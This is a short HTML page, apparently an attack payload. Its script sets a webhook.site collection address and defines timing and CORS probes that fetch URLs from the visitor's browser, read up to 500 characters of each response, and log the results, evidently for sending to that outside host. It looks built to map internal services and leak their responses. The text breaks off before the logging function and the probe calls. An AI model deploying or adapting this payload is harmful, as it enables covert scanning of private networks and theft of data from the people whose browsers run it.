<!doctype html>
<html><body><script>
const BIN = 'https://webhook.site/6353f301-6064-4234-b5c8-361a00e129ba/?p=';

log('boot11 ' + location.href);

async function tprobe(name, url, ms) {
  const t0 = performance.now();
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), ms);
  let outcome = 'ok';
  try { await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: ac.signal }); }
  catch (e) { outcome = (performance.now() - t0 >= ms - 120) ? 'TIMEOUT' : 'err'; }
  finally { clearTimeout(timer); }
  const dt = Math.round(performance.now() - t0);
  if (outcome !== 'err' || dt > 8) log(`t ${name} ${dt}ms ${outcome}`);
}
async function corsprobe(name, url) {
  const t0 = performance.now();
  try {
    const r = await fetch(url, { mode: 'cors', cache: 'no-store' });
    let b = ''; try { b = (await r.text()).slice(0, 500); } catch (e) {}
    log(`C ${name} ${Math.round(performance.now()-t0)}ms status=${r.status} ${b}`);
  } catch (e) { log(`C ${name} ${Math.round(performance.now()-t0)}ms ERR`); }
}
